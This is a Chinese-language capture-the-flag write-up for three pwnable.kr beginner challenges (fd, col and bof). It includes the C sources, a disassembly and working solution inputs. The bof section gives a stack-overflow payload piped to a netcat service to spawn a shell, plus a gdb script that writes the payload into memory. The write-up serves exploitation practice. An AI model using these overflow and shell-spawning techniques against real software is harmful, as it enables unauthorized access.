# pwnable解题记录

## [Toddler's Bottle]

> ​	理论上是比较简单的一层.

### fd

文件描述符---快速定位到文件的元数据.

标准输入就是从我们的键盘进行输入.

| 文件描述符 | 用途               | 宏定义          |
| :--------- | :----------------- | :-------------- |
| `0`        | 标准输入（stdin）  | `STDIN_FILENO`  |
| `1`        | 标准输出（stdout） | `STDOUT_FILENO` |
| `2`        | 标准错误（stderr） | `STDERR_FILENO` |

```C
int fd1 = open("file1.txt", O_RDONLY);  // 可能返回 3
int fd2 = open("file2.txt", O_WRONLY);  // 可能返回 4
```

当我们打开新文件的时候,会返回系统能分配给这个文件的最小整数作为文件描述符.

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
        if(argc<2){
                printf("pass argv[1] a number\n");
                return 0;
        }
        int fd = atoi( argv[1] ) - 0x1234;
        int len = 0;
        len = read(fd, buf, 32);
        if(!strcmp("LETMEWIN\n", buf)){
                printf("good job :)\n");
                setregid(getegid(), getegid());
                system("/bin/cat flag");
                exit(0);
        }
        printf("learn about Linux file IO\n");
        return 0;

}
```

这个很简单,输入的数字减去0x1234 = 0,那么就stdin,和LETMEWIN对比,相同就自动读取了flag.

### col

```man
DESCRIPTION
       col filters out reverse (and half-reverse) line feeds so the output is in the correct order, with only forward and half-forward
       line feeds. It also replaces any whitespace characters with tabs where possible. This can be useful in processing the output of
       nroff(1) and tbl(1).

       col reads from standard input and writes to standard output.

```

过滤反向换行符和特殊字符控制.

| 选项       | 作用                                           |
| :--------- | :--------------------------------------------- |
| `-b`       | 过滤掉所有控制字符（包括反向换行符和退格符）。 |
| `-x`       | 将制表符（Tab）转换为空格（默认保留制表符）。  |
| `-f`       | 保留正向换页符（默认过滤掉）。                 |
| `-l <NUM>` | 设置缓冲区行数（默认为 128 行）。              |

```C
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
        int* ip = (int*)p;
        int i;
        int res=0;
        for(i=0; i<5; i++){
                res += ip[i];
        }
        return res;
}

int main(int argc, char* argv[]){
        if(argc<2){
                printf("usage : %s [passcode]\n", argv[0]);
                return 0;
        }
        if(strlen(argv[1]) != 20){
                printf("passcode length should be 20 bytes\n");
                return 0;
        }

        if(hashcode == check_password( argv[1] )){
                setregid(getegid(), getegid());
                system("/bin/cat flag");
                return 0;
        }
        else
                printf("wrong passcode.\n");
        return 0;
}
```

读入20个字节,分为五个int类型:

```sh
col@ubuntu:~$ ./col "$(printf '\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\xE8\x05\xD9\x1D')"
```

\x表示对应的十六进制转义序列,把十六进制转换成对应的二进制数值.

比如\x00就是不可见字符\<NULL>

### bof

好像基本是堆栈溢出之类的.

```C
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                setregid(getegid(), getegid());
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}

```

检查程序的保护措施:

```sh
bof@ubuntu:~$ checksec ./bof
[!] Could not populate PLT: Cannot allocate 1GB memory to run Unicorn Engine
[*] '/home/bof/bof'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

32bit的小端序.

Relocation Read Only---防止GOT劫持攻击.

No execute---数据堆栈不可以执行---可能只能ROP攻击(不能在栈上面攻击)

ASLR:Position Independent Executable 地址随机化的一种.

发现有Canary的保护.

Stripped:符号表没有剥离,能看到函数名.

逆向:

```asm
000011fd <func>:
    11fd:       55                      push   %ebp
    11fe:       89 e5                   mov    %esp,%ebp
    1200:       56                      push   %esi
    1201:       53                      push   %ebx
    1202:       83 ec 30                sub    $0x30,%esp #分配了48个bytes给这个func
    1205:       e8 f6 fe ff ff          call   1100 <__x86.get_pc_thunk.bx>
    120a:       81 c3 f6 2d 00 00       add    $0x2df6,%ebx
    1210:       65 a1 14 00 00 00       mov    %gs:0x14,%eax #canary
    1216:       89 45 f4                mov    %eax,-0xc(%ebp)
    1219:       31 c0                   xor    %eax,%eax
    121b:       83 ec 0c                sub    $0xc,%esp
    121e:       8d 83 08 e0 ff ff       lea    -0x1ff8(%ebx),%eax
    1224:       50                      push   %eax
    1225:       e8 26 fe ff ff          call   1050 <printf@plt>
    122a:       83 c4 10                add    $0x10,%esp
    122d:       83 ec 0c                sub    $0xc,%esp
    1230:       8d 45 d4                lea    -0x2c(%ebp),%eax
    1233:       50                      push   %eax
    1234:       e8 27 fe ff ff          call   1060 <gets@plt>
    1239:       83 c4 10                add    $0x10,%esp
    123c:       81 7d 08 be ba fe ca    cmpl   $0xcafebabe,0x8(%ebp)
    1243:       75 2d                   jne    1272 <func+0x75>
    1245:       e8 36 fe ff ff          call   1080 <getegid@plt>
    124a:       89 c6                   mov    %eax,%esi
    124c:       e8 2f fe ff ff          call   1080 <getegid@plt>
    1251:       83 ec 08                sub    $0x8,%esp
    1254:       56                      push   %esi
    1255:       50                      push   %eax
    1256:       e8 55 fe ff ff          call   10b0 <setregid@plt>
    125b:       83 c4 10                add    $0x10,%esp
    125e:       83 ec 0c                sub    $0xc,%esp
    1261:       8d 83 17 e0 ff ff       lea    -0x1fe9(%ebx),%eax
    1267:       50                      push   %eax
    1268:       e8 33 fe ff ff          call   10a0 <system@plt>
    126d:       83 c4 10                add    $0x10,%esp
    1270:       eb 12                   jmp    1284 <func+0x87>
    1272:       83 ec 0c                sub    $0xc,%esp
    1275:       8d 83 1f e0 ff ff       lea    -0x1fe1(%ebx),%eax
    127b:       50                      push   %eax
    127c:       e8 0f fe ff ff          call   1090 <puts@plt>
    1281:       83 c4 10                add    $0x10,%esp
    1284:       90                      nop
    1285:       8b 45 f4                mov    -0xc(%ebp),%eax
    1288:       65 2b 05 14 00 00 00    sub    %gs:0x14,%eax
    128f:       74 05                   je     1296 <func+0x99>
    1291:       e8 4a 00 00 00          call   12e0 <__stack_chk_fail_local>
    1296:       8d 65 f8                lea    -0x8(%ebp),%esp
    1299:       5b                      pop    %ebx
    129a:       5e                      pop    %esi
    129b:       5d                      pop    %ebp
    129c:       c3                      ret    

0000129d <main>:
    129d:       8d 4c 24 04             lea    0x4(%esp),%ecx
    12a1:       83 e4 f0                and    $0xfffffff0,%esp
    12a4:       ff 71 fc                push   -0x4(%ecx)
    12a7:       55                      push   %ebp
    12a8:       89 e5                   mov    %esp,%ebp
    12aa:       51                      push   %ecx
    12ab:       83 ec 04                sub    $0x4,%esp
    12ae:       e8 22 00 00 00          call   12d5 <__x86.get_pc_thunk.ax>
    12b3:       05 4d 2d 00 00          add    $0x2d4d,%eax
    12b8:       83 ec 0c                sub    $0xc,%esp
    12bb:       68 ef be ad de          push   $0xdeadbeef
    12c0:       e8 38 ff ff ff          call   11fd <func>
    12c5:       83 c4 10                add    $0x10,%esp
    12c8:       b8 00 00 00 00          mov    $0x0,%eax
    12cd:       8b 4d fc                mov    -0x4(%ebp),%ecx
    12d0:       c9                      leave  
    12d1:       8d 61 fc                lea    -0x4(%ecx),%esp
    12d4:       c3                      ret    
```

可以在pwndgb中直接查看canary的值.

???怎么这么难......

就是简单的栈溢出,但是把问题想复杂了,不难,因为不用检查canary.

​	下面的情况是如果你想修改根据程序实时修改canary的值要进行的操作,就是在get之前直接修改内存的值.

```py
python
payload = b"A"*36 + b"\xbb\xbb\xbb\xbb" + b"\xcc"*16 + b"\xbe\xba\xfe\xca"
buf_addr = int(gdb.parse_and_eval("$ebp-0x30"))
for i, byte in enumerate(payload):
    gdb.execute(f"set {{unsigned char}} ({buf_addr}+{i}) = {byte}")
end
```

那么其实了解了栈的分布了之后:

```sh
bof@ubuntu:~$ ( python3 -c 'import sys; sys.stdout.buffer.write(
    b"A"*52 + b"\xbe\xba\xfe\xca" + b"\n"
)'; cat ) | nc 0 9000
```

返回地址占4bytes + 临时栈分配48bytes

​	和起来就52bytes.在这之前就是我们分配的key,直接覆盖就可以了,破解获取了脚本之后传给nc终端,就能获取root控制权,获取flag.





















































